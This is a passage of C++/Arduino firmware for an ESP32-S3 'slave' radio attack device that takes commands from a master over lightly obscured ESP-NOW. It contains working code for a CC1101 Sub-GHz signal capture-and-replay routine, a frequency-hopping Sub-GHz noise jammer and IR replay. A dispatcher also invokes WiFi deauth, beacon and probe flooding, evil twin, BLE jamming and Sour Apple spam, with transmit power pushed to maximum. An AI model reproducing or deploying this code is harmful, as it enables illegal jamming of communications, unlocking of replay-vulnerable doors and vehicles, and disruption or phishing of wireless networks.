  SPI.transfer(0x34);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

void setCC1101_Idle() {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(0x36);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

int getCC1101_RSSI() {
  uint8_t rssi_raw = readReg(0x34);
  int rssi_dbm;
  if (rssi_raw >= 128) rssi_dbm = (rssi_raw - 256) / 2 - 74;
  else rssi_dbm = rssi_raw / 2 - 74;
  return rssi_dbm;
}

void cc1101Strobe(uint8_t cmd) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(cmd);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

int cc1101ReadFIFO(uint8_t* buf, int maxLen) {
  uint8_t rxBytes = readReg(0x3B | 0xC0);
  if (rxBytes & 0x80) { cc1101Strobe(0x3A); return -1; }
  int toRead = min((int)rxBytes, maxLen);
  if (toRead <= 0) return 0;
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(0xFF);
  for (int i = 0; i < toRead; i++) buf[i] = SPI.transfer(0);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
  return toRead;
}

void cc1101WriteFIFO(const uint8_t* buf, int len) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(0x7F);
  for (int i = 0; i < len; i++) SPI.transfer(buf[i]);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

void startSubGhzScan() {
  sendLogToMaster("[Sub-GHz Scanner] Checking CC1101...");
  bool hwPresent = checkCC1101();
  if (!hwPresent) {
    sendLogToMaster("[Sub-GHz Scanner] CC1101 not detected. Demo scan...", true);
    float frequencies[] = {315.00, 433.92, 868.35};
    for (int i = 0; i < 3; i++) {
      char buf[80];
      int dummyRssi = random(-105, -95);
      snprintf(buf, sizeof(buf), "[Sub-GHz] Freq %.2f MHz: RSSI %d dBm [CLEAN]", frequencies[i], dummyRssi);
      sendLogToMaster(buf);
      char structBuf[80];
      snprintf(structBuf, sizeof(structBuf), "[SUBGHZ_DEV]%.2f MHz|%d dBm|CLEAN", frequencies[i], dummyRssi);
      sendLogToMaster(structBuf);
      delay(500);
    }
    sendLogToMaster("[Sub-GHz Scanner] Demo scan finished.");
    return;
  }
  sendLogToMaster("[Sub-GHz Scanner] CC1101 detected! Scanning...");
  float frequencies[] = {315.00, 433.92, 868.35};
  for (int i = 0; i < 3; i++) {
    setCC1101_Frequency(frequencies[i]);
    delay(150);
    int rssi = getCC1101_RSSI();
    char buf[80];
    const char* modType = rssi > -75 ? "ACTIVE" : (rssi > -90 ? "ASK/OOK" : "CLEAN");
    if (rssi > -75) snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [ACTIVE SIGNAL!]", frequencies[i], rssi);
    else if (rssi > -90) snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [MODERATE]", frequencies[i], rssi);
    else snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [CLEAN]", frequencies[i], rssi);
    sendLogToMaster(buf);
    char structBuf[80];
    snprintf(structBuf, sizeof(structBuf), "[SUBGHZ_DEV]%.2f MHz|%d dBm|%s", frequencies[i], rssi, modType);
    sendLogToMaster(structBuf);
    delay(500);
  }
  setCC1101_Idle();
  sendLogToMaster("[Sub-GHz Scanner] Scan finished.");
}

void startIRScan() {
  sendLogToMaster("[IR Scanner] Point remote at receiver...");
  pinMode(IR_RX_PIN, INPUT);
  unsigned long startTime = millis();
  bool captured = false;
  while (millis() - startTime < 6000) {
    if (digitalRead(IR_RX_PIN) == LOW) {
      unsigned long lowPulse = pulseIn(IR_RX_PIN, LOW, 15000);
      unsigned long highPulse = pulseIn(IR_RX_PIN, HIGH, 15000);
      if (lowPulse > 8000 && lowPulse < 10000 && highPulse > 4000 && highPulse < 5000) {
        uint32_t code = 0; bool ok = true;
        for (int i = 0; i < 32; i++) {
          unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
          unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 2000);
          if (bitLow == 0 || bitHigh == 0) { ok = false; break; }
          code <<= 1;
          if (bitHigh > 1000) code |= 1;
        }
        if (ok) {
          char buf[64];
          snprintf(buf, sizeof(buf), "[IR Scanner] NEC Code: 0x%08X", code);
          sendLogToMaster(buf);
          char structBuf[80];
          snprintf(structBuf, sizeof(structBuf), "[IR_DEV]NEC|0x%04X|0x%04X|32",
                   (uint16_t)((code >> 16) & 0xFFFF), (uint16_t)(code & 0xFFFF));
          sendLogToMaster(structBuf);
          captured = true; break;
        }
      }
      delay(100);
      sendLogToMaster("[IR Scanner] Captured RAW IR transmission!");
      captured = true; break;
    }
    delay(5);
  }
  if (!captured) sendLogToMaster("[IR Scanner] Timeout. No signal.", true);
}

// ===== SUB-GHZ REPLAY =====
#define SUBGHZ_BUF_SIZE 512
uint8_t subghzBuf[SUBGHZ_BUF_SIZE];
int subghzBufLen = 0;
float subghzCapturedFreq = 0;

void cc1101ConfigASK_OOK() {
  setCC1101_Idle(); delay(2);
  writeReg(0x02, 0x06); writeReg(0x08, 0x05); writeReg(0x0B, 0x0C);
  writeReg(0x10, 0xC7); writeReg(0x11, 0x93); writeReg(0x12, 0x30);
  writeReg(0x13, 0x00); writeReg(0x15, 0x00); writeReg(0x18, 0x18);
  writeReg(0x19, 0x16); writeReg(0x1A, 0x6C); writeReg(0x1B, 0x43);
  writeReg(0x1C, 0x40); writeReg(0x1D, 0x91); writeReg(0x21, 0x56);
  writeReg(0x22, 0x11); writeReg(0x23, 0xE9); writeReg(0x24, 0x2A);
  writeReg(0x25, 0x00); writeReg(0x26, 0x1F); writeReg(0x29, 0x59);
  writeReg(0x2C, 0x81); writeReg(0x2D, 0x35); writeReg(0x2E, 0x09);
  writeReg(0x3E, 0xC0); // Max TX power
}

void startSubGhzReplay() {
  if (!checkCC1101()) { sendLogToMaster("[Sub-GHz Replay] CC1101 not detected!", true); return; }
  float scanFreqs[] = {433.92, 315.00, 868.35};
  int numFreqs = 3;
  bool captured = false;
  subghzBufLen = 0;
  sendLogToMaster("[Sub-GHz Replay] Listening for signal...");
  for (int f = 0; f < numFreqs && !captured; f++) {
    float freq = scanFreqs[f];
    char buf[80];
    snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Scanning %.2f MHz...", freq);
    sendLogToMaster(buf);
    cc1101ConfigASK_OOK();
    setCC1101_Frequency(freq);
    cc1101Strobe(0x3A); cc1101Strobe(0x34);
    delay(10);
    unsigned long listenStart = millis();
    while (millis() - listenStart < 5000) {
      esp_task_wdt_reset(); yield();
      int rssi = getCC1101_RSSI();
      if (rssi > -70) {
        snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Signal! RSSI: %d @ %.2f MHz", rssi, freq);
        sendLogToMaster(buf);
        unsigned long captureStart = millis();
        subghzBufLen = 0;
        while (millis() - captureStart < 2000 && subghzBufLen < SUBGHZ_BUF_SIZE) {
          esp_task_wdt_reset();
          int n = cc1101ReadFIFO(subghzBuf + subghzBufLen, SUBGHZ_BUF_SIZE - subghzBufLen);
          if (n > 0) subghzBufLen += n;
          else if (n < 0) break;
          delay(1);
        }
        if (subghzBufLen == 0) {
          sendLogToMaster("[Sub-GHz Replay] FIFO empty, sampling GDO0...");
          unsigned long sampleStart = millis();
          while (millis() - sampleStart < 1500 && subghzBufLen < SUBGHZ_BUF_SIZE) {
            uint8_t byte = 0;
            for (int bit = 7; bit >= 0; bit--) {
              byte |= (digitalRead(2) & 1) << bit;
              delayMicroseconds(200);
            }
            subghzBuf[subghzBufLen++] = byte;
            esp_task_wdt_reset();
          }
        }
        subghzCapturedFreq = freq;
        captured = true; break;
      }
      delay(5);
    }
    setCC1101_Idle();
  }
  if (!captured || subghzBufLen == 0) {
    sendLogToMaster("[Sub-GHz Replay] No signal captured.", true);
    setCC1101_Idle(); return;
  }
  char buf[80];
  snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Captured %d bytes. Replaying...", subghzBufLen);
  sendLogToMaster(buf);
  for (int rep = 0; rep < 3; rep++) {
    esp_task_wdt_reset();
    setCC1101_Idle();
    cc1101ConfigASK_OOK();
    setCC1101_Frequency(subghzCapturedFreq);
    writeReg(0x3E, 0xC0);
    cc1101Strobe(0x3B);
    int offset = 0;
    cc1101Strobe(0x35);
    while (offset < subghzBufLen) {
      int chunk = min(60, subghzBufLen - offset);
      cc1101WriteFIFO(subghzBuf + offset, chunk);
      offset += chunk;
      unsigned long waitStart = millis();
      while (millis() - waitStart < 200) {
        uint8_t txBytes = readReg(0x3A | 0xC0);
        if ((txBytes & 0x7F) < 10) break;
        delayMicroseconds(100);
      }
      esp_task_wdt_reset();
    }
    delay(50);
    setCC1101_Idle();
    snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Replay %d/3 sent", rep + 1);
    sendLogToMaster(buf);
    delay(200);
  }
  setCC1101_Idle();
  sendLogToMaster("[Sub-GHz Replay] Done.");
}

// ===== SUB-GHZ JAMMER =====
bool subghzJammerInitialized = false;
static const float subghzJamFreqs[] = {315.00, 433.92, 868.35};
static int subghzJamFreqIdx = 0;

void cc1101Config2FSK_Jammer() {
  setCC1101_Idle(); delay(2);
  writeReg(0x02, 0x0D); writeReg(0x08, 0x02); writeReg(0x06, 0xFF);
  writeReg(0x0B, 0x0C); writeReg(0x10, 0x18); writeReg(0x11, 0xFF);
  writeReg(0x12, 0x01); writeReg(0x13, 0x00); writeReg(0x15, 0x47);
  writeReg(0x18, 0x18); writeReg(0x21, 0x56); writeReg(0x22, 0x10);
  writeReg(0x23, 0xE9); writeReg(0x24, 0x2A); writeReg(0x25, 0x00);
  writeReg(0x26, 0x1F); writeReg(0x3E, 0xC0);
}

void startSubGhzJammerInit() {
  if (!checkCC1101()) {
    sendLogToMaster("[Sub-GHz Jammer] CC1101 not detected!", true);
    attackRunning = false; return;
  }
  cc1101Config2FSK_Jammer();
  setCC1101_Frequency(433.92);
  cc1101Strobe(0x3B); cc1101Strobe(0x35);
  subghzJammerInitialized = true;
  subghzJamFreqIdx = 0;
  sendLogToMaster("[Sub-GHz Jammer] Active (frequency hopping)");
}

void runSubGhzJammerStep() {
  if (!subghzJammerInitialized) {
    startSubGhzJammerInit();
    if (!subghzJammerInitialized) return;
  }
  // Frequency hopping: Normal=100ms, Boost=70ms, Extreme=30ms
  static unsigned long lastHopTime = 0;
  unsigned long hopInterval = extremeMode ? 30 : (boostMode ? 70 : 100);
  if (millis() - lastHopTime >= hopInterval) {
    lastHopTime = millis();
    subghzJamFreqIdx = (subghzJamFreqIdx + 1) % 3;
    setCC1101_Idle();
    setCC1101_Frequency(subghzJamFreqs[subghzJamFreqIdx]);
    cc1101Strobe(0x3B); cc1101Strobe(0x35);
  }
  uint8_t txBytes = readReg(0x3A | 0xC0);
  if (txBytes & 0x80) { cc1101Strobe(0x3B); cc1101Strobe(0x35); return; }
  int freeSpace = 64 - (txBytes & 0x7F);
  if (freeSpace >= 16) {
    uint8_t noiseBuf[16];
    for (int i = 0; i < 16; i++) noiseBuf[i] = (uint8_t)random(256);
    cc1101WriteFIFO(noiseBuf, 16);
  }
  delayMicroseconds(50);
  static unsigned long lastJamLog = 0;
  if (millis() - lastJamLog >= 3000) {
    lastJamLog = millis();
    char buf[80];
    snprintf(buf, sizeof(buf), "[Sub-GHz Jammer] TX on %.2f MHz%s",
             subghzJamFreqs[subghzJamFreqIdx], extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
    sendLogToMaster(buf);
  }
}

void stopSubGhzJammer() {
  if (subghzJammerInitialized) {
    setCC1101_Idle(); cc1101Strobe(0x3B);
    subghzJammerInitialized = false;
    sendLogToMaster("[Sub-GHz Jammer] Stopped", true);
  }
}

// ===== IR REPLAY =====
#define IR_BUF_MAX 256
uint16_t irPulseBuf[IR_BUF_MAX];
int irPulseCount = 0;

void irCarrierBurst(uint16_t us) {
  unsigned long start = micros();
  while (micros() - start < us) {
    digitalWrite(IR_TX_PIN, HIGH); delayMicroseconds(13);
    digitalWrite(IR_TX_PIN, LOW); delayMicroseconds(13);
  }
}

void startIRReplay() {
  pinMode(IR_RX_PIN, INPUT);
  pinMode(IR_TX_PIN, OUTPUT);
  digitalWrite(IR_TX_PIN, LOW);
  irPulseCount = 0;
  sendLogToMaster("[IR Replay] Point remote at receiver...");
  unsigned long waitStart = millis();
  while (millis() - waitStart < 8000) {
    esp_task_wdt_reset();
    if (digitalRead(IR_RX_PIN) == LOW) break;
    delay(1);
  }
  if (digitalRead(IR_RX_PIN) != LOW) {
    sendLogToMaster("[IR Replay] Timeout.", true); return;
  }
  sendLogToMaster("[IR Replay] Signal detected, capturing...");
  while (irPulseCount < IR_BUF_MAX) {
    unsigned long mark = pulseIn(IR_RX_PIN, LOW, 65000);
    if (mark == 0) break;
    irPulseBuf[irPulseCount++] = (uint16_t)min(mark, 65535UL);
    if (irPulseCount >= IR_BUF_MAX) break;
    unsigned long space = pulseIn(IR_RX_PIN, HIGH, 65000);
    if (space == 0) break;
    irPulseBuf[irPulseCount++] = (uint16_t)min(space, 65535UL);
  }
  if (irPulseCount < 4) { sendLogToMaster("[IR Replay] Too few pulses.", true); return; }
  char buf[80];
  snprintf(buf, sizeof(buf), "[IR Replay] Captured %d pulses. Replaying 3x...", irPulseCount);
  sendLogToMaster(buf);
  for (int rep = 0; rep < 3; rep++) {
    esp_task_wdt_reset();
    for (int i = 0; i < irPulseCount; i++) {
      if (i % 2 == 0) irCarrierBurst(irPulseBuf[i]);
      else { digitalWrite(IR_TX_PIN, LOW); delayMicroseconds(irPulseBuf[i]); }
    }
    digitalWrite(IR_TX_PIN, LOW);
    snprintf(buf, sizeof(buf), "[IR Replay] Replay %d/3 sent", rep + 1);
    sendLogToMaster(buf);
    delay(100);
  }
  digitalWrite(IR_TX_PIN, LOW);
  sendLogToMaster("[IR Replay] Done.");
}

// ===== RESTORE WIFI =====
void restoreWiFiState() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);
}

// ===== STOP ATTACKS =====
void stopAttack() {
  attackRunning = false;
  currentAttack = "";
  boostMode = false;
  extremeMode = false;
  bleJammerInitialized = false;
  sourAppleInitialized = false;
  evilTwinStarted = false;
  lastStationCount = 0;
  isMultiAttack = false;
  multiAttackCount = 0;
  multiAttackIndex = 0;
  stopSubGhzJammer();
  if (dnsStarted) { dnsServer.stop(); dnsStarted = false; }
  logQueueHead = 0; logQueueTail = 0; logQueueCount = 0; logFlushPending = false;
  WiFi.softAPdisconnect(true);
  if (BLEDevice::getAdvertising()) BLEDevice::getAdvertising()->stop();
  esp_wifi_set_promiscuous(false);
  restoreWiFiState();
  digitalWrite(LED_PIN, LOW);
  if (hasMasterMac) {
    struct_message response = {0};
    strlcpy(response.command, "stopped", sizeof(response.command));
    strlcpy(response.logMsg, "All attacks stopped. Standby mode.", sizeof(response.logMsg));
    XOR_crypt((uint8_t*)&response, sizeof(response));
    for (int retry = 0; retry < 3; retry++) {
      esp_task_wdt_reset();
      if (esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response)) == ESP_OK) break;
      delay(5);
    }
  }
  Serial.println("All attacks stopped");
}

// ===== SEND PONG =====
void sendPong(const uint8_t *masterMac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, masterMac, 6);
  peer.channel = 1; peer.encrypt = false;
  if (!esp_now_is_peer_exist(masterMac)) esp_now_add_peer(&peer);
  struct_message response = {0};
  strlcpy(response.command, "pong", sizeof(response.command));
  float sTemp = getBoardTemp();
  snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
  XOR_crypt((uint8_t*)&response, sizeof(response));
  for (int retry = 0; retry < 3; retry++) {
    esp_task_wdt_reset();
    if (esp_now_send(masterMac, (uint8_t *)&response, sizeof(response)) == ESP_OK) break;
    delay(5);
  }
}

void registerMasterPeer(const uint8_t *mac) {
  esp_now_peer_info_t peer;
  memset(&peer, 0, sizeof(peer));
  memcpy(peer.peer_addr, mac, 6);
  peer.channel = 1; peer.encrypt = false;
  if (esp_now_is_peer_exist(mac)) esp_now_del_peer(mac);
  esp_now_add_peer(&peer);
}

// ===== HELPER: Parse BSSID string to bytes =====
void parseBssid(const char* str, uint8_t* out) {
  unsigned int b[6] = {0};
  sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
}

// ===== HELPER: Split string by delimiter =====
int splitString(const String& input, char delimiter, String* output, int maxParts) {
  int partCount = 0;
  int startIdx = 0;
  for (int i = 0; i <= (int)input.length(); i++) {
    if (i == (int)input.length() || input[i] == delimiter) {
      if (partCount < maxParts) {
        output[partCount] = input.substring(startIdx, i);
        partCount++;
      }
      startIdx = i + 1;
    }
  }
  return partCount;
}

// ===== ESP-NOW HANDLER =====
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = info->src_addr;
#else
void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
  const uint8_t *srcMac = mac_addr;
#endif
  if (len > (int)sizeof(myData)) return;
  if (len < (int)sizeof(myData)) return;
  memcpy(&myData, incomingData, sizeof(myData));
  XOR_crypt((uint8_t*)&myData, sizeof(myData));
  myData.command[15] = '\0';
  myData.attack[31] = '\0';
  myData.logMsg[sizeof(myData.logMsg) - 1] = '\0';

  // Store Master MAC
  if (!hasMasterMac || memcmp(masterMacAddress, srcMac, 6) != 0) {
    memcpy(masterMacAddress, srcMac, 6);
    hasMasterMac = true;
    registerMasterPeer(srcMac);
    Preferences prefs;
    prefs.begin("esptool2", false);
    prefs.putBytes("masterMac", masterMacAddress, 6);
    prefs.putBool("hasMasterMac", true);
    prefs.end();
  }
  lastMasterHeardTime = millis();

  if (strcmp(myData.command, "ping") == 0) {
    sendPong(srcMac); return;
  }

  // ===== TARGET SELECTION =====
  if (strcmp(myData.command, "select_target") == 0) {
    String type = String(myData.attack);
    String data = String(myData.logMsg);
    String parts[8];

    if (type == "wifi") {
      int n = splitString(data, '|', parts, 8);
      if (n >= 6) {
        memset(&selectedWifiTarget, 0, sizeof(selectedWifiTarget));
        strlcpy(selectedWifiTarget.ssid, parts[0].c_str(), sizeof(selectedWifiTarget.ssid));
        parseBssid(parts[1].c_str(), selectedWifiTarget.bssid);
        selectedWifiTarget.rssi = parts[2].toInt();
        selectedWifiTarget.channel = parts[3].toInt();
        strlcpy(selectedWifiTarget.security, parts[4].c_str(), sizeof(selectedWifiTarget.security));
        selectedWifiTarget.wps = (parts[5] == "WPS_ENABLED" || parts[5] == "true");
        selectedWifiTarget.selected = true;
        hasWifiTarget = true;
        char buf[80];
        snprintf(buf, sizeof(buf), "[Target] WiFi: %s (ch %d)", selectedWifiTarget.ssid, selectedWifiTarget.channel);
        sendLogToMaster(buf, true);
      }
    } else if (type == "ble") {
      int n = splitString(data, '|', parts, 8);
      if (n >= 3) {
        memset(&selectedBleTarget, 0, sizeof(selectedBleTarget));
        strlcpy(selectedBleTarget.name, parts[0].c_str(), sizeof(selectedBleTarget.name));
        strlcpy(selectedBleTarget.addr, parts[1].c_str(), sizeof(selectedBleTarget.addr));
        selectedBleTarget.rssi = parts[2].toInt();
        selectedBleTarget.selected = true;
        hasBleTarget = true;
        sendLogToMaster("[Target] BLE target set", true);
      }
    } else if (type == "subghz") {
      int n = splitString(data, '|', parts, 8);
      if (n >= 3) {
        memset(&selectedSubghzTarget, 0, sizeof(selectedSubghzTarget));
        selectedSubghzTarget.freq = parts[0].toFloat();
        selectedSubghzTarget.rssi = parts[1].toInt();
        strlcpy(selectedSubghzTarget.mod, parts[2].c_str(), sizeof(selectedSubghzTarget.mod));
        selectedSubghzTarget.selected = true;
        hasSubghzTarget = true;
        sendLogToMaster("[Target] Sub-GHz target set", true);
      }
    } else if (type == "ir") {
      int n = splitString(data, '|', parts, 8);
      if (n >= 4) {
        memset(&selectedIrTarget, 0, sizeof(selectedIrTarget));
        strlcpy(selectedIrTarget.proto, parts[0].c_str(), sizeof(selectedIrTarget.proto));
        strlcpy(selectedIrTarget.addr, parts[1].c_str(), sizeof(selectedIrTarget.addr));
        strlcpy(selectedIrTarget.cmd, parts[2].c_str(), sizeof(selectedIrTarget.cmd));
        selectedIrTarget.len = parts[3].toInt();
        selectedIrTarget.selected = true;
        hasIrTarget = true;
        sendLogToMaster("[Target] IR target set", true);
      }
    }
    return;
  }

  // ===== CLEAR TARGET =====
  if (strcmp(myData.command, "clear_target") == 0) {
    hasWifiTarget = false; hasBleTarget = false;
    hasSubghzTarget = false; hasIrTarget = false;
    sendLogToMaster("[Target] All targets cleared", true);
    return;
  }

  // ===== MULTI ATTACK =====
  if (strcmp(myData.command, "multi_attack") == 0) {
    if (attackRunning) {
      sendLogToMaster("[Warning] Attack already active", true);
      return;
    }
    String attackList = String(myData.attack);
    multiAttackMode = String(myData.logMsg);
    String parts[MAX_MULTI_ATTACKS];
    multiAttackCount = splitString(attackList, ',', parts, MAX_MULTI_ATTACKS);
    for (int i = 0; i < multiAttackCount; i++) {
      multiAttacks[i] = parts[i];
      multiAttacks[i].trim();
    }
    if (multiAttackCount > 0) {
      isMultiAttack = true;
      attackRunning = true;
      multiAttackIndex = 0;
      // Set mode
      boostMode = (multiAttackMode == "boost" || multiAttackMode == "extreme");
      extremeMode = (multiAttackMode == "extreme");
      char buf[80];
      snprintf(buf, sizeof(buf), "Multi-attack started (%d attacks) [%s]", multiAttackCount, multiAttackMode.c_str());
      sendLogToMaster(buf, true);
    }
    return;
  }

  // ===== STANDARD COMMANDS =====
  if (strcmp(myData.command, "start") == 0) {
    if (attackRunning) {
      sendLogToMaster("[Warning] Attack already active", true);
      return;
    }
    attackRunning = true;
    currentAttack = String(myData.attack);
    // Determine mode from suffix
    if (currentAttack.endsWith("_extreme")) {
      extremeMode = true; boostMode = true;
      currentAttack = currentAttack.substring(0, currentAttack.length() - 8);
    } else if (currentAttack.endsWith("_boost")) {
      boostMode = true; extremeMode = false;
      currentAttack = currentAttack.substring(0, currentAttack.length() - 6);
    } else {
      boostMode = false; extremeMode = false;
    }
    char buf[64];
    snprintf(buf, sizeof(buf), "Starting: %s%s", currentAttack.c_str(),
             extremeMode ? " [EXTREME]" : (boostMode ? " [BOOST]" : ""));
    sendLogToMaster(buf);
  } else if (strcmp(myData.command, "stop") == 0) {
    stopAttack();
  }
}

// ===== EXECUTE SINGLE ATTACK STEP =====
void executeAttackStep(const String& attack) {
  if (attack == "beacon") runBeaconSpamStep();
  else if (attack == "deauth") runDeauthStep();
  else if (attack == "probe") runProbeFloodStep();
  else if (attack == "powerful_jammer") runPowerfulJammerStep();
  else if (attack == "wifi_scan") { startWiFiScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; restoreWiFiState(); } }
  else if (attack == "evil_twin") {
    if (!evilTwinStarted) { startEvilTwin(); evilTwinStarted = true; lastStationCount = -1; }
    runEvilTwinStep();
  }
  else if (attack == "ble_scan") { startBLEScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
  else if (attack == "ble_spoofer") startBLESpoofer();
  else if (attack == "ble_jammer") runBLEJammerStep();
  else if (attack == "sour_apple") runSourAppleStep();
  else if (attack == "ghz_scan") { startGhzScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
  else if (attack == "protokill") { currentAttack = "powerful_jammer"; }
  else if (attack == "subghz_scan") { startSubGhzScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
  else if (attack == "subghz_replay") { startSubGhzReplay(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
  else if (attack == "subghz_jammer") runSubGhzJammerStep();
  else if (attack == "ir_scan") { startIRScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
  else if (attack == "ir_replay") { startIRReplay(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
}

// ===== SETUP =====
void setup() {
  Serial.begin(115200);
  randomSeed(esp_random());
#if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
  esp_task_wdt_config_t wdt_config = { .timeout_ms = 30000, .idle_core_mask = (1 << 0) | (1 << 1), .trigger_panic = true };
  esp_task_wdt_init(&wdt_config);
#else
  esp_task_wdt_init(30, true);
#endif
  esp_task_wdt_add(NULL);

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();
  WiFi.setSleep(false);

  // Max TX power
  esp_wifi_set_max_tx_power(84); // +21 dBm

  // Set low data rate for range
  esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  // Initialize BLE with max power
  BLEDevice::init("ESP32-S3");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P21);

  // SPI for CC1101
  SPI.begin(12, 13, 11, 10);
  if (checkCC1101()) Serial.println("CC1101 found!");
  else Serial.println("CC1101 not found.");

  if (esp_now_init() != ESP_OK) { Serial.println("ESP-NOW init error"); return; }
  esp_now_register_recv_cb(OnDataRecv);

  Preferences prefs;
  prefs.begin("esptool2", false);
  if (prefs.getBool("hasMasterMac", false)) {
    prefs.getBytes("masterMac", masterMacAddress, 6);
    hasMasterMac = true;
    Serial.printf("Loaded Master MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  masterMacAddress[0], masterMacAddress[1], masterMacAddress[2],
                  masterMacAddress[3], masterMacAddress[4], masterMacAddress[5]);
    registerMasterPeer(masterMacAddress);
  }
  prefs.end();

  lastMasterHeardTime = millis();
  Serial.println("SLAVE v1.2 ready");
  Serial.print("My MAC: ");
  Serial.println(WiFi.macAddress());
}

// ===== LOOP =====
void loop() {
  updateLedIndicator();
  esp_task_wdt_reset();

  // Send queued logs
  if (millis() - lastLogQueueSendTime >= LOG_QUEUE_SEND_INTERVAL) {
    lastLogQueueSendTime = millis();
    processLogQueue();
  }

  // Safety timeout
  if (attackRunning && hasMasterMac && (millis() - lastMasterHeardTime > 15000)) {
    Serial.println("Master timeout. Stopping.");
    stopAttack();
  }

  if (attackRunning) {
    // Listen window for Master commands
    if (millis() - lastListenTime >= 1000) {
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      unsigned long startListen = millis();
      while (millis() - startListen < 500) { delay(1); yield(); esp_task_wdt_reset(); }
      lastListenTime = millis();
      if (!attackRunning) return;
    }

    if (isMultiAttack) {
      // Multi-attack round-robin
      if (multiAttackCount > 0) {
        executeAttackStep(multiAttacks[multiAttackIndex]);
        multiAttackIndex = (multiAttackIndex + 1) % multiAttackCount;
      }
    } else if (currentAttack != "") {
      executeAttackStep(currentAttack);
    }
  }
  delay(1);
}
